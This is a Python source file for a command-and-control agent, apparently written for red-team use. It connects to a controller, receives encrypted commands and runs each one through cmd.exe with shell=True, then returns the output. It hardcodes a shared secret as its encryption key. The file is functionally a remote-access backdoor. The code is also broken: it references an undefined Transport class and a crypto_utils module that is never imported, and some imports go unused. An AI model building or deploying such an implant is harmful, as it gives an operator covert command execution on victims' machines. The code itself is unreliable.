
from crypto_utils import decrypt_payload, derive_key, encrypt_payload
from transport import recv_frame, send_frame
import socket, threading, json, os, subprocess, time
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import hashlib

HOST = '127.0.0.1'
PORT = 9999
SHARED_SECRET = b"RedTeamSecretKey12345!"
AES_KEY = hashlib.sha256(SHARED_SECRET).digest()


class C2Agent:
    def __init__(self):
        self.agent_id = f"{socket.gethostname()}_{os.getpid()}"
        print(f"[+] Agent Initialized. ID: {self.agent_id}")

    def connect_and_listen(self):
        try:
            transport = Transport(HOST, PORT)
            client_socket = transport.connect()

            # Send initial handshake with nonce and agent ID
            header_data = json.dumps({'id': self.agent_id})
            transport.send_to_client(client_socket, {'type': 'handshake', 'payload': header_data})

            print(f"[+] Connected to Controller. Waiting for commands...")

            while True:
                try:
                    packet = transport.recv_from_client(client_socket)
                    if not packet:
                        break

                    encrypted_payload = crypto_utils.decrypt_payload(AES_KEY, packet)
                    msg_type = encrypted_payload.get('type')
                    payload_data = encrypted_payload.get('payload', '')

                    response = {}

                    if msg_type == 'cmd':
                        try:
                            result = subprocess.check_output(
                                f'cmd.exe /c {payload_data}', shell=True, stderr=subprocess.STDOUT, timeout=10)
                            response['type'] = 'resp'
                            response['status'] = 'success'
                            response['output'] = result.decode()
                        except Exception as e:
                            response['type'] = 'resp'
                            response['status'] = 'error'
                            response['output'] = str(e)

                    elif msg_type == 'ping':
                        response['type'] = 'resp'
                        response['payload'] = 'alive'

                    else:
                        continue  # Ignore unknown types

                    encrypted_resp = crypto_utils.encrypt_payload(AES_KEY, response)
                    transport.send_to_client(client_socket, encrypted_resp)

                except Exception as e:
                    print(f"[!] Command Error from {client_socket.getpeername()}: {e}")
                    break

        except Exception as e:
            print(f"[!] Connection error: {e}")


if __name__ == "__main__":
    try:
        agent = C2Agent()
        agent.connect_and_listen()
    except KeyboardInterrupt:
        print("\n[+] Agent Shutting Down...")
